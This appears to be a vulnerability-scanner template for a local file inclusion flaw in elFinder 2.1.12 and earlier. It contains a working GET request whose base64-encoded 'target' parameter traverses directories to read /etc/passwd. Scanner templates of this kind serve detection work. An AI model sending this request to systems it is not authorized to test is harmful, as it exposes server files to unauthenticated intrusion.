id: elFinder-path-traversal
brief:
    title: elFinder  <=2.1.12 - Local File Inclusion
    by: ritikchaddha
    level: high
    about: elFinder through 2.1.12 is vulnerable to local file inclusion via Connector.minimal.php in std42. This allows unauthenticated remote attackers to read, write, and browse files outside the configure...
    label:
        - lfi
        - elfinder
        - vuln
    score: CVSS:7.5
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/php/connector.minimal.php?cmd=file&target=l1_Li8vLi4vLy4uLy8uLi8vLi4vLy4uLy8uLi9ldGMvcGFzc3dk&download=1'
      head:
        Content-Type: application/x-www-form-urlencoded
      signs:
        - "on": status
          status:
            - 200
